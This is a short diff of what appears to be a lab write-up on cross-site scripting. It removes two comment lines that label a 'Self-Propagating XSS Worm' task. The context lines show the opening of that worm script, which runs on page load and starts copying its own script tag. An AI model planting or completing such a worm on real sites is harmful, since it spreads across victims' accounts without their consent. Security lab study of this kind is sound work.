@@ -177,8 +177,6 @@ src="http://www.example.com/myscripts.js">
 - Javascript code to run Self propagating XSS worme:
 
    ```
-  // Attack 3 - Task 6: WSelf-Propagating XSS Worm:
-  // DOM Approach:
   <script type="text/javascript" id="worm">
     window.onload = function() {
       var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
